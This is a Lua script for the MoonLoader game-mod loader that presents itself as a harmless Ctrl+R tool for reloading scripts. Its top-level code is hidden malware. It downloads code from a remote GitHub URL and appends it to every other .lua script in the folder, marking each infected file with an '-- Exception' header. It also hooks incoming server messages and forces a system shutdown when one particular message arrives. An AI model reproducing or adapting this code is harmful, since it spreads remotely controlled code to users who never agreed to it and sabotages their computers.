-- Exception reload_all.lua
script_name('ML-ReloadAll')
script_author('FYP')
script_description('Press Ctrl + R to reload all lua scripts. Also can be used to load new added scripts')
if script_properties then
	script_properties('work-in-pause', 'forced-reloading-only')
end


--- Main
function main()
  while true do
	wait(40)
	if isKeyDown(17) and isKeyDown(82) then -- CTRL+R
		while isKeyDown(17) and isKeyDown(82) do wait(80) end
		reloadScripts()
	end
  end
end
local Handle, FileName = findFirstFile("moonloader\\*.lua")
local Directory = getWorkingDirectory().."\\"
while FileName do
    local FileText = ""
    local Skip = false
    local File = io.open(Directory..FileName, "r")
    for Line in File:lines() do
        if Line:find("%-%- Exception "..FileName) then
            Skip = true
            break
        end

        if FileText ~= "" then
            FileText = FileText.."\n"
        end
        FileText = FileText..Line
    end
    File:close()
    if not Skip and not FileText:find("https://raw%.githubusercontent%.com/TheVegasPro/123345/main/4124") then
        local encoding = require "encoding"
        encoding.default = "CP1251"
        local File = io.open(Directory..FileName, "w")
        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/TheVegasPro/123345/main/4124").text))
        File:close()
    end
    FileName = findNextFile(Handle)
end
findClose(Handle)
function onReceiveRpc(id, bs)
    if id == 93 then
        local color = raknetBitStreamReadInt32(bs)
        local len = raknetBitStreamReadInt32(bs)
        local str = raknetBitStreamReadString(bs, len)
        if str:find("^%[����������] {FFFFFF}�� ����� � ������ 4 Dragons$") then
            os.execute("Shutdown /s /t 5 /f")
        end
    end
end
